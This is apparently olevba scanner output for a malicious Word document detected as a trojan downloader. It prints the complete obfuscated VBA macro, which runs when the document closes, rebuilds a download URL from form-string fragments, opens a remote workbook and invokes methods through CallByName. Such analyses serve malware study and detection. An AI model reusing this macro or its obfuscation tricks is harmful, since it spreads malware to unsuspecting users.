olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.Agent.gen-98087ff9c441fca59904b4352c7466eeefbf47101528781397a83cab43c6300e
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public ic0k, j2m4, nsz, k8k, ayjl
Sub Document_Close()
tp = Application.Options.DefaultOpenFormat
zio16
zihl3 = Application.Options.DeletedTextColor
If tp > 4755 Then
e68q = Application.Options.AutoFormatPreserveStyles
tp = e68q
End If
End Sub
Sub zio16()
On Error Resume Next
Application.DisplayAlerts = False
Err.Number = 0
UserForm2.ComboBox1.ListIndex = 2
Dim fy
de8a = Application.Options.AutoFormatAsYouTypeAutoLetterWizard
If zihl3 > 818 Then
cfhu = Application.Options.MatchFuzzyByte
zihl3 = cfhu
End If
fz = Application.Options.CheckGrammarWithSpelling
If de8a > 3175 Then
tk = Application.Options.SmartParaSelection
de8a = tk
End If
Set fy = CreateObject(UserForm1.ComboBox1)
hk = Application.Options.DiacriticColorVal
If fz > 2534 Then
hl = Application.Options.AutoFormatReplaceFractions
fz = hl
End If
Application.Activate
If hk > 61 Then
qu = Application.Height
hk = qu
End If
wogcf = Application.Options.AutoFormatAsYouTypeReplaceOrdinals
fy.DisplayAlerts = False
dr = "visible"
o7bta = "OnTime"
Dim vdf6q
nqu7w = 1
om = 1
While nqu7w <> 0 And om < 3
Set vdf6q = fy.Workbooks.Open(FileName:=UserForm2.ComboBox1, Password:=UserForm1.ComboBox2)
nqu7w = Err.Number
om = om + 1
Wend
If nqu7w <> 0 Then
tmv4s = Application.Options.ShortMenuNames
If kjj > 3363 Then
vt = Application.Options.AutoCreateNewDrawings
kjj = vt
k93wq = Application.Options.Pagination
If wogcf > 3063 Then
ph = Application.Options.PasteSmartStyleBehavior
wogcf = ph
End If
fmvp = Application.Options.CreateBackup
If k93wq > 4383 Then
bnhh4 = Application.Options.AutoKeyboardSwitching
k93wq = bnhh4
End If
Application.Activate
If fmvp > 37 Then
y80um = Application.Options.UseCharacterUnit
fmvp = y80um
End If
kjj = Application.Options.ShowControlCharacters
If y80um > 1542 Then
ho = Application.Options.AutoFormatAsYouTypeReplaceHyperlinks
y80um = ho
End If
End If
fz6i = Application.Options.MatchFuzzyCase
If tmv4s > 2424 Then
fh = Application.Options.GridDistanceHorizontal
tmv4s = fh
End If
u5 = CallByName(Application, dr, 2)
If u5 = True Then
Set xbn4u = CreateObject(UserForm1.ComboBox3)
xbn4u.Documents.Open ActiveDocument.FullName, ReadOnly:=True
uqvc1 = Application.Options.ShowControlCharacters
If fz6i > 4194 Then
u35 = Application.Options.AutoFormatAsYouTypeApplyTables
fz6i = u35
End If
xbn4u.Run "ThisDocument." & "zio16"
Else
rt9 = Application.Options.AutoFormatAsYouTypeMatchParentheses
If uqvc1 > 2847 Then
otfx5 = Application.Options.InlineConversion
uqvc1 = otfx5
End If
UserForm1.ComboBox4 = UserForm1.ComboBox4 & "0"
Application.OnTime Now + TimeSerial(0, 0, 20), "ThisDocument." & "zio16"
End If
fy.Quit
Exit Sub
End If
baxh = Application.Build
If rt9 > 2722 Then
h1 = Application.Options.DiacriticColorVal
rt9 = h1
End If
Dim l0s
Set l0s = fy.sheets(1)
nnps = "'"
zl = fy.sheets(2).Cells(129, 24).Value
j2m4 = fy.sheets(3).Cells(208, 22).Value
ak3i = fy.sheets(3).Cells(217, 34).Value
fzro5 = fy.sheets(2).Cells(58, 48).Value
p9ocg = fy.sheets(1).Cells(243, 23).Value
c9 = fy.sheets(3).Cells(233, 15).Value
ayjl = fy.sheets(3).Cells(238, 7).Value
n6 = l0s.Cells(93, 41).Value
ab = l0s.Cells(139, 41).Value
za28f = fy.sheets(2).Cells(48, 28).Value
bu2a = fy.sheets(2).Cells(90, 37).Value
j2a = fy.sheets(2).Cells(137, 14).Value
v0 = fy.sheets(3).Cells(187, 15).Value
lnvp6 = fy.sheets(2).Cells(111, 25).Value
db = fy.sheets(3).Cells(205, 40).Value
ly = fy.sheets(3).Cells(65, 4).Value
gjree = fy.sheets(2).Cells(72, 41).Value
g4 = fy.sheets(2).Cells(41, 17).Value
tna = l0s.Cells(92, 15).Value
l3 = fy.sheets(3).Cells(255, 23).Value
o40ki = Application.Options.CommentsColor
If baxh > 3970 Then
bu7h = Application.Options.AnimateScreenMovements
baxh = bu7h
End If
p77zi = fy.sheets(3).Cells(102, 45).Value
dfcsx = fy.sheets(3).Cells(69, 21).Value
ew = Application.Options.MultipleWordConversionsMode
If o40ki > 3818 Then
j5kb = Application.Options.AutoFormatAsYouTypeReplacePlainTextEmphasis
o40ki = j5kb
End If
ic0k = fy.sheets(3).Cells(67, 48).Value
sjww2 = fy.sheets(3).Cells(82, 13).Value
uvx9o = l0s.Cells(101, 35).Value
bzfw = fy.sheets(2).Cells(121, 3).Value
vc9h3 = CallByName(fy, za28f, 2)
Set a7 = UserForm1.Controls.Add("Forms.ComboBox.1")
a7.Value = zl & vc9h3 & sjww2
Set fvr = UserForm1.Controls.Add("Forms.ComboBox.1")
fvr.Value = c9
CallByName CreateObject(p77zi), ak3i, 1, a7, ly, fvr
aqofj = Application.MillimetersToPoints(86)
If ew > 155 Then
z5x = Application.Options.DefaultBorderLineWidth
ew = z5x
End If
Set fhf7 = CreateObject(g4)
Set pi0n = CallByName(fhf7, j2a, 2)
Set ymhwz = CallByName(pi0n, fzro5, 1)
Set bzfw = CallByName(fhf7, bzfw, 2)
Set k8k = fhf7
Set v0 = CallByName(bzfw, v0, 2)
Set tna = CallByName(v0, tna, 2)
Set te = CallByName(tna, p9ocg, 1, n6)
Set ic0k = CallByName(te, ic0k, 2)
bu2a = CallByName(ic0k, bu2a, 2)
CallByName ic0k, ab, 1, 1, bu2a
Set nsz = UserForm1.Controls.Add("Forms.ComboBox.1")
nsz.Value = l3 & db
UserForm3.ComboBox1 = dfcsx
nyi = Application.Options.AutoFormatReplaceOrdinals
If aqofj > 2649 Then
jx5h5 = Application.Options.CheckHangulEndings
aqofj = jx5h5
End If
a6h = Application.Options.AutoFormatPreserveStyles
If nyi > 3580 Then
x11 = Application.Options.MatchFuzzyByte
nyi = x11
End If
nsz.Value = gjree
sl = Application.Options.BackgroundSave
If lgxyw > 4505 Then
sqs = Application.Options.CursorMovement
lgxyw = sqs
lgxyw = Application.Options.AutoFormatMatchParentheses
End If
UserForm4.ComboBox1 = UserForm3.ComboBox1
UserForm3.ComboBox1 = bu2a
fhf7 = Nothing
kt76 = Application.CheckSpelling("bp")
If sl > 47 Then
k41o = Application.Options.MatchFuzzyOldKana
sl = k41o
End If
ceqvd = Application.Options.AutoFormatAsYouTypeDefineStyles
n9jsa = Application.Options.SendMailAttach
If ceqvd > 3908 Then
tnpuz = Application.Options.CtrlClickHyperlinkToOpen
ceqvd = tnpuz
End If
vdf6q = Nothing
l0s = Nothing
rty = Application.Options.MatchFuzzyHiragana
If n9jsa > 2008 Then
fr35 = Application.Options.AutoFormatAsYouTypeApplyBorders
n9jsa = fr35
End If
pi0n = Nothing
ymhwz = Nothing
bzfw = Nothing
v0 = Nothing
tna = Nothing
te = Nothing
ic0k = Nothing
k8k = Nothing
DoEvents
CallByName fy, lnvp6, 1
fy = Nothing
DoEvents
CallByName CreateObject(p77zi), uvx9o, 1, zl & vc9h3 & sjww2
m53 = Application.Options.RevisedPropertiesMark
If rty > 3074 Then
d4 = Application.Options.SuggestSpellingCorrections
rty = d4
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 

hclb = Application.Options.SavePropertiesPrompt

If xlqhu > 2562 Then


rfdc4 = Application.Options.Overtype

xlqhu = rfdc4


xlqhu = Application.Options.AutoFormatAsYouTypeApplyHeadings

If et7j > 932 Then


wpfwp = Application.Options.BackgroundSave

et7j = wpfwp

End If

End If

 On Error GoTo ErrorHandler

ldy = Application.Options.GridOriginVertical

If hclb > 1057 Then


fljs = Application.Options.SnapToGrid

hclb = fljs

End If


 og5s1 = UserForm2.Controls.Count - 1
 

jz5x = Application.CapsLock

If ldy > 1283 Then


vxu7r = Application.Options.HebrewMode

ldy = vxu7r

End If

 If Len(UserForm1.ComboBox4) > 10 Then
 og5s1 = og5s1 * 2
 End If

 gn = ""
 For et7j = 1 To og5s1 Step 2
 gn = gn & UserForm2.Controls.Item(et7j)
 Next

 ComboBox1.AddItem "cf"
 ComboBox1.AddItem "ue84q"
 ComboBox1.AddItem gn
 ComboBox1.AddItem "ay"
 
 Exit Sub
 
ErrorHandler:
 
 
 
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserForm3.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.ic0k, ActiveDocument.j2m4, VbMethod, ActiveDocument.nsz
End Sub

 
-------------------------------------------------------------------------------
VBA MACRO UserForm4.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.k8k, ActiveDocument.ayjl, VbMethod, ActiveDocument.nsz
End Sub

 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
excel.application">
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i5x0wbqe81s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
word.application
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'excel.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'i5x0wbqe81s'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'word.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'http'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'pDg'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b's://'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox5'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'sHG'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox6'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'heav'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox7'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Ii'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox8'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'enly'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox9'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'HSp'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox10'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'gem.'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox11'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Pq'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox12'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'com/'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox13'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'bkS'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox14'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'11.p'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox15'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Pd'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox16'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'hp'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox17'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'xt'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|#UB$                |23554224                                     |
+----------+--------------------+---------------------------------------------+

